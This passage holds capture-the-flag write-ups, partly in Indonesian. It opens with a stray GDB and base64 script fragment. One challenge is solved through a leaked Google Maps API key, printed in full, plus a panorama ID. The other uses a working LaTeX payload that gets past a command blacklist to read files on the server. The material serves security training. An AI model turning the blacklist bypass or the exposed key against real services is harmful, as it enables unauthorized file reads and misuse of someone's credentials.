	isinya = gdb.execute('x/s ' + match2, to_string=True)
	# print(isinya)
	match3 = re.search(pattern3, isinya).group(0).replace('"', '')
	res = base64.b64decode(match3)
	print(match, res)
	print(base64.b64decode(res[:-1]))
```

---

title: "notsogeo | Challenge"

---

notsogeo - web
===

## Description
Here is an early iteration of Geosint that is more similar to how GeoGuessr loads its Street View panorama. I wonder how we can find the location?

Note: https://github.com/JustHackingCo/geosint this is not the source for this challenge but it is what the site is based off of :)

Author: `gary`

Connection Info:
:::info
https://notsogeo.chall.lol
:::

## Exploit
Tujuan challenge ini adalah untuk mendapatkan koordinat lokasi yang tepat saat bermain geoguesr, dan kita bisa mendapatkan lokasi tersebut dengan memanfaatkan kredensial google API dan juga panoid yang terleak pada server.

Pada challenge ini kita bisa mendapatkan api key google map dari server dengan melihat source code dari halaman https://notsogeo.chall.lol/chall .

Saat kita melihat source codenya akan terlihat API key seperti berikut:

![](https://i.imgur.com/SA8opG5.png)

Setelah itu kita perlu mendapatkan **panoid** dari server, seperti gambar dibawah ini:

<center>mendapatkan dengan cara mengakses info.json</center>

![](https://i.imgur.com/mxt7ZRB.png)

<center>mendapatkan dengan cara memantau request yang keluar</center>

![](https://i.imgur.com/5AHlewU.png)

**panoid** ini nanti akan berguna untuk mendapatkan lokasi yang terdapat di challenge geoguesr.

Setelah mendapatkan keduanya, kita bisa mengakses api googlemap dan mendapatkan koordinat dari lokasi di geoguesr seperti berikut:

:::info
https://maps.googleapis.com/maps/api/streetview/metadata?pano=E79vkEu2pHDfiUkvUWHciA&key=AIzaSyBCDNiWcrx9rLjH11gyhIaXCZQl18WTiPY
:::

![](https://i.imgur.com/cZNzcT8.png)

Setelah kita mendapatkan koordinatnya, kita tinggal mengirimkan koordinat itu ke endpoint `/chall/submit` dan kita akan mendapatkan flagnya seperti gambar dibawah:

![](https://i.imgur.com/47ZwZPO.png)

---

title: "Homework Render | Challenge"

---

Homework Render - web
===

## Description

Isn't writing math homework hard? We have created an easy-to-use homework submission portal that allows you to type up your homework. We don't think anyone can get into this server for free answers!

Author: `ap`

Connection Info:
:::info
https://hw-render.chall.lol
:::

## Exploit

![Screenshot of the challenge description](https://i.imgur.com/8ybAN3s.png)

In this challenge, we are given a website that can render LaTeX files as shown in the image above. It is known that LaTeX can be exploited to perform LFI (Local File Inclusion) by using commands like "input" to include a file in the LaTeX document. However, the website has a blacklist of certain text that cannot be used to call LaTeX commands.

After some trial and error using LaTeX commands, I discovered that we can use the following LaTeX code to gain local file inclusion and read the flag at */app/flag*:

```latex
\documentclass{article}
\RequirePackage{verbatim}
\begin{document}
\newtoks\in
\newtoks\put
\in={in}
\put={put}

\begin{verbatim\the\in\the\put}{/app/flag}\end{verbatim\the\in\the\put}
\end{document}
```

In the exploit above, we use *\RequirePackage* instead of *\usepackage* to import a package. We then use *\newtoks* to create new variables *in* and *put*. Finally, we use *\begin* and *\end* to call a string as a command, allowing us to use *\verbatiminput* to read the contents of */app/flag*.

After submitting the LaTeX code, the flag we obtain is shown below:

![](https://i.imgur.com/8RsTwYK.png)
